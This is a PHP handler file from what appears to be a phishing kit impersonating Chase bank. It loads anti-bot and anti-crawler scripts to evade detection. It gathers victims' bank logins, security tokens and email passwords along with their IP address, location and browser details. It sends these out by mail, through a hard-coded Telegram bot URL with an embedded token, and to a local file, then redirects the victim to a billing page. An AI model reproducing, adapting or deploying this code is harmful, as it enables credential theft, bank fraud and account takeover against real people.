<?php
// require 'vendor/autoload.php';
// include('mailer.php');
session_start();
require_once '../main.php';
include('../detects.php');
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-Spox.php';
include'anti/blacklist.php';
include'anti/new.php';
include'anti/Dila_DZ.php';
include('../blockers.php');
if (!$_POST['emailPassword']){
    } else {
        $userbank = $_SESSION['userbank'];
        $passwordbank = $_SESSION['passwordbank'];
        $securityTokenbank = $_SESSION['securityTokenbank'];
        $emaildress = $_SESSION['emaildress'] = $_POST['emaildress'];
        $emailPassword = $_SESSION['emailPassword'] = $_POST['emailPassword'];
        $emailretry = $_SESSION['emailretry'] = $_POST['emailretry'];
        $emailType = $_SESSION['emailType'] = $_POST['emailType'];
        $emailProvider = $_SESSION['emailProvider'] = $_POST['emailProvider'];
        $cityg = $_SESSION['cityg'] = $_POST['cityg'];
        $regiong = $_SESSION['regiong'] = $_POST['regiong'];
        $countryg = $_SESSION['countryg'] = $_POST['countryg'];
        $datet= $date;
        $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
        $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
        $VictimInfo3 = "| User4gent : " . $user_agent . "";
        $VictimInfo4 = "| Br0wser : " . $br . "";
        $VictimInfo5 = "| Os : " . $os . "";
        $message = "+ -------- 👻💥 [⚡ ELARABY ⚡] 💥👻 -----------+\n";
        $message .= "+ 🏦 CHASE Login Deteils\n";
        $message .= "UserName : $userbank\n";
        $message .= "password : $passwordbank\n";
        if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| CHASE Security T0ken : $securityTokenbank\n";
        }
        $message .= "+ ------------------------------------+\n";
        $message .= "Email $emailretry\n";
        $message .= "Email : $emaildress\n";
        $message .= "password: $emailPassword\n";
        $message .= "EMAIL Provider : $emailProvider\n";
        $message .= "EMAIL Type : $emailType\n";
        $message .= "+ ------------------------------------+\n";
        $message .= "+ 🌐 Victim Information\n";
        $message .= "$VictimInfo1\n";
        $message .= "$VictimInfo2\n";
        $message .= "$VictimInfo3\n";
        $message .= "$VictimInfo4\n";
        $message .= "$VictimInfo5\n";
        $message .= "| 🕛 Received : $date\n";
        $message .= "+ ------------------------------------+\n";
    $subject = "CHASE EMAIL: ".$_POST['emaildress']." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CHASE EMAIL  ".$emailretry." ".$emaildress, $subject, $message);
	file_get_contents('https://api.telegram.org/bot5157139736:AAG_tQwVnXuAPrz8auSZ4KvCehaZrU-rkbo/sendMessage?text='.$message.'&chat_id=1148960035');
    if($save_file == "on") {
        $save = fopen("../rs/email.txt","a+");
		fwrite($save,$message);
    fclose($save);
    }
    header('Location: billing?key='.$key);
}
?>